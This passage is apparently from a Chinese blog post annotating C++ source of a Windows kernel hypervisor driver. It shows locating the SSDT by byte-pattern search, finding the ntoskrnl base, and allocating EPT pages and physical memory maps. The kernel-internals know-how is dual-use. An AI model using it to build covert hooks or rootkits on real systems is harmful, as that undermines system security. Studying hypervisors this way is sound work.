class="string">&quot;\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7&quot;</span>;</span><br><span class="line">            <span class="comment">// 模式匹配</span></span><br><span class="line">            NTSTATUS status = <span class="built_in">UtilSearchPattern</span>( pattern, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>( pattern ) - <span class="number">1</span>, ntosBase + pSec-&gt;VirtualAddress, pSec-&gt;Misc.VirtualSize, &amp;pFound );</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">            &#123;   <span class="comment">// 找到SSDT表</span></span><br><span class="line">                g_SSDT = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)pFound + *(PULONG)((PUCHAR)pFound + <span class="number">3</span>) + <span class="number">7</span>);</span><br><span class="line">                <span class="comment">//DPRINT( &quot;BlackBone: %s: KeSystemServiceDescriptorTable = 0x%p\n&quot;, CPU_NUM, __FUNCTION__, g_SSDT );</span></span><br><span class="line">                <span class="keyword">return</span> g_SSDT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取NTOS内核基地址"><a href="#获取NTOS内核基地址" class="headerlink" title="获取NTOS内核基地址"></a>获取NTOS内核基地址</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get ntoskrnl base address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pSize&quot;&gt;Size of module&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilKernelBase</span><span class="params">( OUT PULONG pSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    ULONG bytes = <span class="number">0</span>;</span><br><span class="line">    PRTL_PROCESS_MODULES pMods = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID checkPtr = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Already found</span></span><br><span class="line">    <span class="keyword">if</span> (g_KernelBase != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pSize)</span><br><span class="line">            *pSize = g_KernelSize;</span><br><span class="line">        <span class="keyword">return</span> g_KernelBase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>( &amp;routineName, <span class="string">L&quot;NtOpenFile&quot;</span> );<span class="comment">// 初始化查找名称</span></span><br><span class="line"></span><br><span class="line">    checkPtr = <span class="built_in">MmGetSystemRoutineAddress</span>( &amp;routineName );<span class="comment">// 获取系统函数地址</span></span><br><span class="line">    <span class="keyword">if</span> (checkPtr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Protect from UserMode AV</span></span><br><span class="line">    <span class="comment">// 保护来自用户模式的AV（防止访问冲突）</span></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 查询系统模块信息的缓冲区大小</span></span><br><span class="line">        status = <span class="built_in">ZwQuerySystemInformation</span>( SystemModuleInformation, <span class="number">0</span>, bytes, &amp;bytes );</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;BlackBone: %s: Invalid SystemModuleInformation size\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分配缓冲区</span></span><br><span class="line">        pMods = (PRTL_PROCESS_MODULES)<span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, bytes, HB_POOL_TAG );</span><br><span class="line">        <span class="comment">// 清空缓冲区</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( pMods, bytes );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取系统模块信息</span></span><br><span class="line">        status = <span class="built_in">ZwQuerySystemInformation</span>( SystemModuleInformation, pMods, bytes, &amp;bytes );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 模块的信息 </span></span><br><span class="line">            PRTL_PROCESS_MODULE_INFORMATION pMod = pMods-&gt;Modules;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pMods-&gt;NumberOfModules; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// System routine is inside module</span></span><br><span class="line">                <span class="keyword">if</span> (checkPtr &gt;= pMod[i].ImageBase &amp;&amp;</span><br><span class="line">                    checkPtr &lt; (PVOID)((PUCHAR)pMod[i].ImageBase + pMod[i].ImageSize))</span><br><span class="line">                &#123;</span><br><span class="line">                    g_KernelBase = pMod[i].ImageBase;<span class="comment">// 找到的内核基址</span></span><br><span class="line">                    g_KernelSize = pMod[i].ImageSize;<span class="comment">// 找到的内核大小</span></span><br><span class="line">                    <span class="keyword">if</span> (pSize)</span><br><span class="line">                        *pSize = g_KernelSize;<span class="comment">// 从参数返回内核大小</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;BlackBone: %s: Exception\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pMods)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pMods, HB_POOL_TAG );<span class="comment">// 释放缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g_KernelBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对给定区域进行模式匹配"><a href="#对给定区域进行模式匹配" class="headerlink" title="对给定区域进行模式匹配"></a>对给定区域进行模式匹配</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Search for pattern</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pattern&quot;&gt;Pattern to search for&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;wildcard&quot;&gt;Used wildcard&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;base&quot;&gt;Base address for searching&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;size&quot;&gt;Address range to search in&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ppFound&quot;&gt;Found location&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="comment">/// 遍历给定内存区域，与指定模式进行字节比较，进行模式匹配</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilSearchPattern</span><span class="params">( IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN <span class="type">const</span> VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( ppFound != <span class="literal">NULL</span> &amp;&amp; pattern != <span class="literal">NULL</span> &amp;&amp; base != <span class="literal">NULL</span> );<span class="comment">// 断言</span></span><br><span class="line">    <span class="keyword">if</span> (ppFound == <span class="literal">NULL</span> || pattern == <span class="literal">NULL</span> || base == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (ULONG_PTR i = <span class="number">0</span>; i &lt; size - len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            BOOLEAN found = TRUE;</span><br><span class="line">            <span class="keyword">for</span> (ULONG_PTR j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (pattern[j] != wildcard &amp;&amp; pattern[j] != ((PCUCHAR)base)[i + j])</span><br><span class="line">                &#123;</span><br><span class="line">                    found = FALSE;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (found != FALSE)</span><br><span class="line">            &#123;</span><br><span class="line">                *ppFound = (PUCHAR)base + i;</span><br><span class="line">                <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNHANDLED_EXCEPTION;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初始化全局变量"><a href="#初始化全局变量" class="headerlink" title="初始化全局变量"></a>初始化全局变量</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate global data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated data or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PGLOBAL_DATA <span class="title">AllocGlobalData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VCPU代表虚拟中央处理单元（Virtual Central Processing Unit），也称为逻辑处理器。</span></span><br><span class="line"><span class="comment">    它是在虚拟化环境中为虚拟机创建的一种模拟的CPU。</span></span><br><span class="line"><span class="comment">    每个虚拟机可以有一个或多个VCPU，它们负责执行虚拟机中的指令和处理计算任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    EPT代表扩展页面表（Extended Page Table）。</span></span><br><span class="line"><span class="comment">    EPT是Intel处理器中的一种硬件技术，</span></span><br><span class="line"><span class="comment">    用于虚拟地址到物理地址的转换。在虚拟化环境中，EPT用于管理虚拟机中的内存访问，</span></span><br><span class="line"><span class="comment">    实现虚拟机之间和虚拟机与宿主操作系统之间的地址隔离和保护。</span></span><br><span class="line"><span class="comment">    EPT表存储了虚拟地址与物理地址之间的映射关系。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Page表示内存页，是计算机系统中内存管理的最小单位。在常见的架构中，一个页面的大小通常为4KB。</span></span><br><span class="line"><span class="comment">    内存页被用于分配和管理内存，用于存储程序指令和数据。</span></span><br><span class="line"><span class="comment">    在这段代码中，Page指的是用于存储EPT表的一块连续的内存页。</span></span><br><span class="line"><span class="comment">    通过预分配这些页面并将页面地址存储在VCPU的EPT.Pages数组中，来管理EPT表的相关信息。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    PHYSICAL_ADDRESS low = &#123; <span class="number">0</span> &#125;, high = &#123; <span class="number">0</span> &#125;;<span class="comment">// 物理地址</span></span><br><span class="line">    high.QuadPart = MAXULONG64;<span class="comment">// 最大的64位ULONG</span></span><br><span class="line"></span><br><span class="line">    ULONG cpu_count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );<span class="comment">// 当前CPU数量</span></span><br><span class="line">    ULONG_PTR size = <span class="built_in">FIELD_OFFSET</span>( GLOBAL_DATA, cpu_data ) + cpu_count * <span class="built_in">sizeof</span>( VCPU );<span class="comment">// 计算全局数据结构大小</span></span><br><span class="line">    <span class="comment">// 在非分页池中分配内存，大小为size</span></span><br><span class="line">    PGLOBAL_DATA pData = (PGLOBAL_DATA)<span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, size, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pData, size );<span class="comment">// 将分配的内存清零</span></span><br><span class="line">    <span class="comment">// 在非分页池中分配内存，大小为一页，存储MSR寄存器位图</span></span><br><span class="line">    pData-&gt;MSRBitmap = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, PAGE_SIZE, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;MSRBitmap == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 分配失败，释放空间</span></span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData, HB_POOL_TAG );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pData-&gt;MSRBitmap, PAGE_SIZE );</span><br><span class="line">    <span class="comment">// 获取CPU制造商信息</span></span><br><span class="line">    pData-&gt;CPUVendor = <span class="built_in">UtilCPUVendor</span>();</span><br><span class="line">    <span class="comment">// 遍历cpu_data数组，对VCPU进行初始化</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; cpu_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PVCPU Vcpu = &amp;pData-&gt;cpu_data[i];</span><br><span class="line">        <span class="comment">// 初始化VCPU中的页链表</span></span><br><span class="line">        <span class="built_in">InitializeListHead</span>( &amp;Vcpu-&gt;EPT.PageList );</span><br><span class="line">        <span class="comment">// 循环预分配EPT页面</span></span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; EPT_PREALLOC_PAGES; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 分配一个连续页面</span></span><br><span class="line">            Vcpu-&gt;EPT.Pages[j] = <span class="built_in">MmAllocateContiguousMemorySpecifyCache</span>( PAGE_SIZE, low, high, low, MmNonCached );</span><br><span class="line">            <span class="keyword">if</span> (Vcpu-&gt;EPT.Pages[j] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置页面为可读写</span></span><br><span class="line">                <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE, PAGE_READWRITE );</span><br><span class="line">                <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取物理内存信息"><a href="#获取物理内存信息" class="headerlink" title="获取物理内存信息"></a>获取物理内存信息</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gather info about used physical pages</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilQueryPhysicalMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Memory != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取物理内存范围信息</span></span><br><span class="line">    PPHYSICAL_MEMORY_RANGE pBaseRange = <span class="built_in">MmGetPhysicalMemoryRanges</span>();</span><br><span class="line">    <span class="keyword">if</span> (pBaseRange == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历链表，计算物理内存页面数目pageCount和区域数量runsCount</span></span><br><span class="line">    ULONG runsCount = <span class="number">0</span>, pageCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;NumberOfBytes.QuadPart != <span class="number">0</span>; pRange++)</span><br><span class="line">    &#123;</span><br><span class="line">        pageCount += (ULONG)<span class="built_in">PFN</span>( pRange-&gt;NumberOfBytes.QuadPart );</span><br><span class="line">        runsCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    APIC（Advanced Programmable Interrupt Controller）是一种高级可编程中断控制器，用于处理中断和异常。</span></span><br><span class="line"><span class="comment">    它是一种在计算机体系结构中实现中断控制的硬件设备。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在多核处理器系统中，每个核心都有自己的本地 APIC。本地 APIC 负责接收和处理与该核心相关的中断，并将其分发给适当的处理器。</span></span><br><span class="line"><span class="comment">    此外，还有一个 I/O APIC，负责管理外部设备的中断信号以及将它们分发给适当的处理器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    APIC 提供了一种灵活和可扩展的方式来管理和处理中断，使得系统能够高效地响应各种设备和事件引起的中断请求。</span></span><br><span class="line"><span class="comment">    它支持优先级、屏蔽、中断分发和处理、中断共享等功能，能够提高系统的可靠性和性能。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    APIC 物理页是指用于存储 APIC 相关数据结构的物理内存页。在x86 架构的计算机系统中，</span></span><br><span class="line"><span class="comment">    APIC 物理页通常位于物理内存的固定地址上，</span></span><br><span class="line"><span class="comment">    并用于存储本地 APIC、I/O APIC 和其他与 APIC 相关的寄存器和数据结构。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取APIC物理页信息</span></span><br><span class="line">    IA32_APIC_BASE apic = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    apic.All = __readmsr( MSR_APIC_BASE );<span class="comment">// IA32_APIC_BASE寄存器的值</span></span><br><span class="line">    runsCount += <span class="number">2</span>;<span class="comment">// 添加到 runsCount 中</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算Memory需要的大小，并为全局变量分配内存</span></span><br><span class="line">    ULONG size =  <span class="built_in">sizeof</span>( PPHYSICAL_MEMORY_DESCRIPTOR ) + runsCount * <span class="built_in">sizeof</span>( PHYSICAL_MEMORY_RUN );</span><br><span class="line">    g_Data-&gt;Memory = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, size, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Memory != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( g_Data-&gt;Memory, size );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将物理内存范围信息复制到全局变量中，设置每个范围的起始页和页面数目</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;NumberOfPages = pageCount;</span><br><span class="line">        g_Data-&gt;Memory-&gt;NumberOfRuns  = runsCount;</span><br><span class="line"></span><br><span class="line">        runsCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;BaseAddress.QuadPart != <span class="number">0</span>; pRange++, runsCount++)</span><br><span class="line">        &#123;</span><br><span class="line">            g_Data-&gt;Memory-&gt;Run[runsCount].BasePage  = <span class="built_in">PFN</span>( pRange-&gt;BaseAddress.QuadPart );</span><br><span class="line">            g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = <span class="built_in">PFN</span>( pRange-&gt;NumberOfBytes.QuadPart );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加用于存储APIC的单个页</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount].BasePage  = apic.Fields.Apic_base;</span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 添加从0xF0000000共计0x10000页面的保留页</span></span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount + <span class="number">1</span>].BasePage = <span class="built_in">PFN</span>( <span class="number">0xF0000000</span> );</span><br><span class="line">        g_Data-&gt;Memory-&gt;Run[runsCount + <span class="number">1</span>].PageCount = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ExFreePool</span>( pBaseRange );</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ExFreePool</span>( pBaseRange );</span><br><span class="line">    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="释放全局变量"><a href="#释放全局变量" class="headerlink" title="释放全局变量"></a>释放全局变量</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Free global data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pData&quot;&gt;Data pointer&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">FreeGlobalData</span><span class="params">( IN PGLOBAL_DATA pData )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pData == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前系统中活动处理器的数量</span></span><br><span class="line">    ULONG cpu_count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );</span><br><span class="line">    <span 